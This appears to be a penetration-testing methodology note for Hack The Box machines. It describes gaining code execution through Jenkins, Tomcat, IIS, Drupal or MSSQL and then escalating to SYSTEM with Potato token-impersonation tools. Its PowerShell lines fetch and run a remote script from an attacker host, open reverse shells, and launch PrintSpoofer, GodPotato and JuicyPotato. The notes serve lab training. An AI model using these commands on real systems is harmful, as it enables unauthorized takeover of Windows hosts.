# Attack Pattern — Web RCE as Service Account → Token Impersonation → SYSTEM

> The Jeeves / Bastard / Devel pattern. Web app or service exposes RCE
> as a Windows service account that holds `SeImpersonatePrivilege`.
> Use a Potato variant to upgrade to SYSTEM.

## Signature

```
nmap → web port (often non-default: 8080, 50000, 8443)
  → app fingerprint = Jenkins / Tomcat / IIS / Drupal / similar
       → unauthenticated RCE feature OR known CVE OR default creds
            → reverse shell as service account
                 → whoami /priv → SeImpersonate Enabled
                      → Potato (Juicy / Print / God / Rogue) → SYSTEM
                           → root.txt
```

## Step-by-step

### 1. Identify a web service that runs as a privileged service account

Common app → service-account combinations:
- Jenkins → typically runs as `Local Service` or named service account
  (often with SeImpersonate).
- Tomcat → `LocalService` / `NetworkService`.
- IIS App Pool → `IIS APPPOOL\<poolname>` (always has SeImpersonate).
- MSSQL → `NT Service\MSSQL$<instance>` (has SeImpersonate).
- ManageEngine, Oracle, JBoss — same family.

### 2. Get RCE

Choose the lowest-friction primitive:
- **Jenkins**: `/script` Groovy console (Jeeves).
- **Tomcat**: manager app + WAR upload (`tomcat:tomcat`).
- **IIS WebDAV**: PROPFIND / PUT exploit (Devel).
- **Drupal**: Drupalgeddon family (Bastard).
- **MSSQL**: `xp_cmdshell` after auth.

### 3. Drop a reverse shell

```powershell
# from RCE primitive
IEX (New-Object Net.WebClient).DownloadString('http://atk/Invoke-PowerShellTcp.ps1')
Invoke-PowerShellTcp -Reverse -IPAddress atk -Port 4444
```

### 4. Confirm SeImpersonate

```powershell
whoami
# iis apppool\defaultapppool   (or similar)
whoami /priv
# SeImpersonatePrivilege   Enabled
# SeAssignPrimaryTokenPrivilege   Enabled
```

### 5. Upload the right Potato

Decision per OS:
- **Win 7 / 8 / 10 (≤1803), Server 2008-2016** → JuicyPotato.exe.
- **Win 10 (1809+) / Server 2019** → PrintSpoofer.exe or RoguePotato.exe.
- **Modern (Server 2022)** → GodPotato.exe (broadest coverage).

```powershell
# upload via webclient or impacket-smbserver
$wc = New-Object Net.WebClient
$wc.DownloadFile('http://atk/PrintSpoofer.exe','C:\Windows\Temp\ps.exe')
```

### 6. Trigger SYSTEM

```powershell
# PrintSpoofer
.\ps.exe -i -c "powershell -nop -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://atk/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress atk -Port 4445"

# GodPotato
.\GodPotato.exe -cmd "cmd /c whoami > C:\Windows\Temp\who.txt"

# JuicyPotato (older)
.\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c <command>" -t *
```

### 7. Read flag / persist

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

## Real HTB Examples

- **Jeeves** — Jenkins on :50000 → Groovy → kohsuke service →
  RottenPotato (path A) or KeePass intended path (path B).
- **Bastard** — Drupal RCE → IIS App Pool → JuicyPotato.
- **Bounty** — IIS web.config bypass → JuicyPotato.
- **Devel** — IIS WebDAV upload → JuicyPotato (or kernel via
  ms16_032).
- **Granny / Grandpa** — IIS WebDAV foothold + JuicyPotato.
- **Conceal** — VPN + HTTP API → JuicyPotato.
- **SecNotes, Querier** — variants with MSSQL service accounts.

## Decision-tree

```
nmap → web port + Windows OS
  ├─ Jenkins → /script → Groovy RCE → service shell
  ├─ Tomcat → manager → WAR upload → service shell
  ├─ IIS → WebDAV / aspx upload → service shell
  ├─ Drupal/Joomla/etc → CVE-driven RCE → service shell
  └─ MSSQL → xp_cmdshell → service shell
       └─ whoami /priv | findstr SeImpersonate
            ├─ has it → Potato → SYSTEM
            └─ doesn't → other privesc family (kernel / config / cred)
```

## Why this works

Service accounts in Windows have `SeImpersonatePrivilege` by default
(IIS/MSSQL) or by deployment convention (Jenkins, Tomcat). Once you
land as one, COM-based impersonation gives SYSTEM — a feature, not a
bug, deliberately exploited by the Potato family.

## Anti-patterns

- Skipping `whoami /priv` and assuming the box requires kernel exploit.
- Using JuicyPotato on Server 2019 (patched).
- Using PrintSpoofer on a host where the print spooler is disabled.
- Forgetting to upload the binary to a *writable* directory
  (`C:\Windows\Temp` is the default safe choice).

## Related Skills

- [`web/jenkins-groovy-rce.md`](../web/jenkins-groovy-rce.md)
- [`windows-privesc/token-impersonation.md`](../windows-privesc/token-impersonation.md)
- [`tool-usage/winpeas.md`](../tool-usage/winpeas.md)
- [`methodology/05-windows-attack-flow.md`](../methodology/05-windows-attack-flow.md)
- [`methodology/13-post-exploitation.md`](../methodology/13-post-exploitation.md)
